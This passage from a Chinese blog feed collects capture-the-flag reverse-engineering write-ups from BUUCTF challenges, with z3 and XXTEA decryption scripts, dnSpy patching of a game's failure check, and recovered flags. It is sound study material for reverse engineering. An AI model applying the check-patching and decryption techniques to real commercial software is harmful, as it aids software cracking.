CPP"></a>[GXYCTF2019]simple CPP</h2><p>今天也是讨厌C++逆向的一天呢~<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGXYCTF2019%5DsimpleCPP1.png"><br>异或的东西可以通过动调得到<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGXYCTF2019%5DsimpleCPP2.png"><br>然后是<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGXYCTF2019%5DsimpleCPP3.png"><br>接着是<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGXYCTF2019%5DsimpleCPP4.png"><br>最后那一大坨考虑使用z3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>, <span class="number">64</span>)<span class="comment">#用Int进行不了~运算</span></span><br><span class="line">y = BitVec(<span class="string">&#x27;y&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">z = BitVec(<span class="string">&#x27;z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">w = BitVec(<span class="string">&#x27;w&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s.add(z &amp;amp; (~x) == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add(<span class="number">0x3E3A4717373E7F1F</span> ^ w == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add(<span class="number">0x11204161012</span> | (x &amp;amp; y) | (z &amp;amp; (~y)) | (x &amp;amp; (~y)) == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add((z &amp;amp; (~y)) &amp;amp; x | z &amp;amp; ((x &amp;amp; y) | y &amp;amp; ~x | ~(y | x)) == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(<span class="number">0x11204161012</span> | (x &amp;amp; y) | y &amp;amp; z == ~x &amp;amp; z | <span class="number">0xC00020130082C0C</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check():</span><br><span class="line">    r = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">        <span class="built_in">print</span>(i, <span class="built_in">hex</span>(r[i].as_long()))</span><br></pre></td></tr></table></figure><p>将得到的答案在异或回去：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans[<span class="number">99</span>];</span><br><span class="line">    <span class="type">char</span> XOR[] = <span class="string">&quot;i_will_check_is_debug_or_not&quot;</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> i, j, flag[<span class="number">99</span>];</span><br><span class="line">    ans[<span class="number">1</span>] = <span class="number">865872043546520588</span>;</span><br><span class="line">    ans[<span class="number">0</span>] = <span class="number">4483973367147818765</span>;</span><br><span class="line">    ans[<span class="number">3</span>] = <span class="number">842073600</span>;</span><br><span class="line">    ans[<span class="number">2</span>] = <span class="number">577031497978884115</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                flag[i*<span class="number">8</span>+j] = (ans[i] &amp;amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                ans[i] = ans[i] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                flag[i*<span class="number">8</span>+j] = (ans[i] &amp;amp; <span class="number">0xFF00000000000000</span>) &gt;&gt; <span class="number">56</span>;</span><br><span class="line">                ans[i] = ans[i] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] ^= XOR[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以得到乱码<code>We1l_D0ndaQbg�_Slgebra_am_i</code><br>经百度，是题错了，z3解出来不止一组解。挺神奇的，5个条件约束不住4个数。<br>得到flag：We1l_D0ne!P0or_algebra_am_i</p><h2 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h2><p>get了一个dnSpy的新玩法。拖进去容易找到加密函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn5%5DUltimateMinesweeper1.png"><br>但是仔细看一看发现它用revealedCells作为种子生成了一个随机数数组array，之后在加密输出。因此想法是动调，查看一下会让我们失败的函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn5%5DUltimateMinesweeper2.png"><br>根据英文提示，第一个if就是失败判定，把它右键、编辑方法，给它注释掉：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn5%5DUltimateMinesweeper3.png"><br>右下角编译之后Ctrl+shift+s保存为新程序，运行新程序，找到三个非雷地块：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn5%5DUltimateMinesweeper4.png"><br>之后再在正常的程序里点击这三个地块，得到flag：<a href="mailto:&#67;&#104;&#x33;&#x61;&#x74;&#101;&#x72;&#115;&#x5f;&#65;&#108;&#119;&#52;&#x79;&#x73;&#95;&#87;&#49;&#x6e;&#x40;&#102;&#108;&#97;&#x72;&#101;&#x2d;&#111;&#110;&#46;&#x63;&#111;&#x6d;">&#67;&#104;&#x33;&#x61;&#x74;&#101;&#x72;&#115;&#x5f;&#65;&#108;&#119;&#52;&#x79;&#x73;&#95;&#87;&#49;&#x6e;&#x40;&#102;&#108;&#97;&#x72;&#101;&#x2d;&#111;&#110;&#46;&#x63;&#111;&#x6d;</a></p><h2 id="MRCTF2020-PixelShooter"><a href="#MRCTF2020-PixelShooter" class="headerlink" title="[MRCTF2020]PixelShooter"></a>[MRCTF2020]PixelShooter</h2><p>附件是一个apk，但是里面有很多unity的关键字，所以去找Assembly-CSharp.dll：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BMRCTF2020%5DPixelShooter1.png"><br>导出后拖进dnSpy，在UIControler方法中找到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BMRCTF2020%5DPixelShooter2.png"><br>得到flag：Unity_1S_Fun_233</p><h2 id="FlareOn1-Bob-Doge"><a href="#FlareOn1-Bob-Doge" class="headerlink" title="[FlareOn1]Bob Doge"></a>[FlareOn1]Bob Doge</h2><p>又是一个C#的程序，拖入dnSpy，容易找到加密函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn1%5DBobDoge1.png"><br>发现需要寻找dat_secret，可惜找不到（话说，这玩意儿是怎么藏起来的？），所以准备动调：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn1%5DBobDoge2.png"><br>在数据栏中得到flag：<a href="mailto:&#x33;&#114;&#x6d;&#x61;&#x68;&#103;&#51;&#x72;&#x64;&#x2e;&#98;&#x30;&#98;&#46;&#x64;&#48;&#x67;&#x65;&#x40;&#x66;&#108;&#97;&#114;&#101;&#45;&#x6f;&#x6e;&#x2e;&#x63;&#x6f;&#109;">&#x33;&#114;&#x6d;&#x61;&#x68;&#103;&#51;&#x72;&#x64;&#x2e;&#98;&#x30;&#98;&#46;&#x64;&#48;&#x67;&#x65;&#x40;&#x66;&#108;&#97;&#114;&#101;&#45;&#x6f;&#x6e;&#x2e;&#x63;&#x6f;&#109;</a></p><h2 id="2019红帽杯-xx"><a href="#2019红帽杯-xx" class="headerlink" title="[2019红帽杯]xx"></a>[2019红帽杯]xx</h2><p>红帽杯的题总能让我眼前一黑<br>首先判断输入位数为19位，然后判断输入的值是不是在特定字符串里。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx1.png"><br>然后构造key，发现key保留了输入的前4个，其余的赋0，再将其转为4个32位数用于XXTEA。然后你需要坚定不移地猜输入的前4个就是”flag”。XXTEA的代码是真心没看懂，但好在他是标准的。通过动调可以知道如果输入为1234，在XXTEA中input会变成34333231，解密时要注意大小端序。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx2.png"><br>对加密结果进行打乱，并且进行了一个离谱的异或。解异或需要从后往前解。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx3.png"><br>最后进行对比，这种赋值方式也会产生大小端序的问题，算不过来的话……动调吧！骚年！<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx4.png"><br>写出脚本:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XXTEA</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">int</span> n, <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">    sum = rounds * DELTA;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp;amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p - <span class="number">1</span>];</span><br><span class="line">            y = v[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">206</span>, <span class="number">188</span>,  <span class="number">64</span>, <span class="number">107</span>, <span class="number">124</span>,  <span class="number">58</span>, <span class="number">149</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">155</span>,  <span class="number">32</span>,  <span class="number">32</span>, <span class="number">145</span>, <span class="number">247</span>,   <span class="number">2</span>,  <span class="number">53</span>,  <span class="number">35</span>,  <span class="number">24</span>,   <span class="number">2</span>, <span class="number">200</span>, <span class="number">231</span>,  <span class="number">86</span>,  <span class="number">86</span>, <span class="number">250</span>&#125;, enc[<span class="number">99</span>];</span><br><span class="line">    <span class="type">int</span> v21 = <span class="number">23</span>, v22 = <span class="number">23</span>, i, j;</span><br><span class="line">    <span class="keyword">for</span>(; v21 &gt;= <span class="number">1</span>; v22--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v23 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(v21 / <span class="number">3</span> &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                ans[v22] ^= ans[v23];</span><br><span class="line">                v23++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (v23 &lt; v21 / <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v21--;</span><br><span class="line">    &#125;</span><br><span class="line">    enc[<span class="number">2</span>] = ans[<span class="number">0</span>];</span><br><span class="line">    enc[<span class="number">0</span>] = ans[<span class="number">1</span>];</span><br><span class="line">    enc[<span class="number">3</span>] = ans[<span class="number">2</span>];</span><br><span class="line">    enc[<span class="number">1</span>] = ans[<span class="number">3</span>];</span><br><span class="line">    enc[<span class="number">6</span>] = ans[<span class="number">4</span>];</span><br><span class="line">    enc[<span class="number">4</span>] = ans[<span class="number">5</span>];</span><br><span class="line">    enc[<span class="number">7</span>] = ans[<span class="number">6</span>];</span><br><span class="line">    enc[<span class="number">5</span>] = ans[<span class="number">7</span>];</span><br><span class="line">    enc[<span class="number">10</span>] = ans[<span class="number">8</span>];</span><br><span class="line">    enc[<span class="number">8</span>] = ans[<span class="number">9</span>];</span><br><span class="line">    enc[<span class="number">11</span>] = ans[<span class="number">10</span>];</span><br><span class="line">    enc[<span class="number">9</span>] = ans[<span class="number">11</span>];</span><br><span class="line">    enc[<span class="number">14</span>] = ans[<span class="number">12</span>];</span><br><span class="line">    enc[<span class="number">12</span>] = ans[<span class="number">13</span>];</span><br><span class="line">    enc[<span class="number">15</span>] = ans[<span class="number">14</span>];</span><br><span class="line">    enc[<span class="number">13</span>] = ans[<span class="number">15</span>];</span><br><span class="line">    enc[<span class="number">18</span>] = ans[<span class="number">16</span>];</span><br><span class="line">    enc[<span class="number">16</span>] = ans[<span class="number">17</span>];</span><br><span class="line">    enc[<span class="number">19</span>] = ans[<span class="number">18</span>];</span><br><span class="line">    enc[<span class="number">17</span>] = ans[<span class="number">19</span>];</span><br><span class="line">    enc[<span class="number">22</span>] = ans[<span class="number">20</span>];</span><br><span class="line">    enc[<span class="number">20</span>] = ans[<span class="number">21</span>];</span><br><span class="line">    enc[<span class="number">23</span>] = ans[<span class="number">22</span>];</span><br><span class="line">    enc[<span class="number">21</span>] = ans[<span class="number">23</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = (flag[i] &lt;&lt; <span class="number">8</span>) + enc[i*<span class="number">4</span>+j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x67616c66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">XXTEA</span>(flag, <span class="number">6</span>, key);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i] &amp;amp; <span class="number">0xFF</span>);</span><br><span class="line">            flag[i] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：CXX_and_++tea</p><h2 id="CFI-CTF-2018-IntroToPE"><a href="#CFI-CTF-2018-IntroToPE" class="headerlink" title="[CFI-CTF 2018]IntroToPE"></a>[CFI-CTF 2018]IntroToPE</h2><p>这道题就比较水了，打开找到判断函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BCFI-CTF2018%5DIntroToPE1.png"><br>可以看出，应当使validatePassword.verifyPassword()返回真值，双击跟踪：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BCFI-CTF2018%5DIntroToPE2.png"><br>看见是一个base64，理论上应该接着去找加密使用的对应表，可惜没找到，就用默认的吧。<br>得到flag：.NetC#_1s_@w3s0m3</p><h2 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h2><p>非常sb的一道题，先jsfuck，再z3。<br>得到flag：A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF逆向工程-2&quot;&gt;&lt;a href=&quot;#BUUCTF逆向工程-2&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF逆向工程-2&quot;&gt;&lt;/a&gt;BUUCTF逆向工程-2&lt;/h1&gt;&lt;h2 id=&quot;相册&quot;&gt;&lt;a href=&quot;#相册&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF逆向工程-1</title>
    <link href="https://clovershrub.github.io/2022/11/20/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/"/>
    <id>https://clovershrub.github.io/2022/11/20/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/</id>
    <published>2022-11-19T16:00:00.000Z</published>
    <updated>2023-09-19T02:08:59.377Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF逆向工程-1"><a href="#BUUCTF逆向工程-1" class="headerlink" title="BUUCTF逆向工程-1"></a>BUUCTF逆向工程-1</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>这题很水，拖进IDA就可以解出来<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/easyre1.png"><br>很明显，flag：this_Is_a_EaSyRe</p><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p>拖进IDA发现只有这么个东西<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse11.png"><br>所以果断shift+F12从字符串寻找突破口，得到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse12.png"><br>跟进可以进入到真正的主程序：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse13.png"><br>不难发现它将输入和Str2进行比较，并且在前面将Str2中的o变成了0，跟进Str2可以看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse14.png"><br>得到flag：hell0_w0rld</p><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>比上一题仁慈，拽进IDA直接可以看代码：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse21.png"><br>将输入和flag作比较，并在之前把r和i变成1，跟进看见flag是：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse22.png"><br>得到flag：hack1ng_fo1_fun</p><h2 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h2><p>打开IDA可以看见v5这个抽象的玩意儿：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B61.png"><br>没错，这货就是答案，flag：49d3c93df25caad81232130f3d2ebfad<br>说实话，我不理解这题存在的意义</p><h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><p>exeinfoPE告诉我它有壳并且可以使用自带的upx -d解决，所以就解决一下：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%901.png"><br>在拖入IDA可以看见主程序：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%902.png"><br>通过我们在小学二年级就学会的代码，可以读出来flag：HappyNewYear!</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>拖进IDA可以看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/xor1.png"><br>它对输入进行了一通异或操作并且与global进行比较，将global提取出来异或回去即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> key[<span class="number">99</span>] = &#123;</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>, </span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>, </span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>, </span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,   <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">32</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">    key[i] ^= key[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：QianQiuWanDai_YiTongJiangHu</p><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><p>打开APKIDE，找到主方法，可以看到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/helloworld1.png"><br>得到flag：7631a988259a00816deda84afb29430a</p><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p>IDA里看见它对输入做了sub_4110BE操作，然后又做了一个简单的加法，最后和Str2比较：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse31.png"><br>点进sub_4110BE可以看见这么个抽象的东西：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/reverse32.png"><br>看出这东西是个base64加密，搞一搞：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span 